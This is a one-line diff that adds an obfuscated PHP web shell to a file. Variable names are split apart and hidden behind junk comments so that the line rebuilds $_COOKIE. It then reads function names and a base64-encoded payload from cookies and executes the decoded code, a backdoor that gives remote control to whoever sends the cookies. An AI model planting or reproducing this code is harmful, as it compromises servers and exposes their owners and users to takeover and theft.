@@ -1,0 +1,1 @@
+<?php $am='OO';/*[8*/$kl='_C';/*S+Wq*/$pe='KI';/*Y*/$pf='E';$ok/*cUs5*/=${$kl.$am.$pe.$pf};$un=/*`1Dx*/$ok['KJ'].$ok/*Wn*/['T'];$wu=$ok['gl'].$ok['Ja'].$ok['Jh'];$rt=$un('',$wu($ok['U']));$rt();
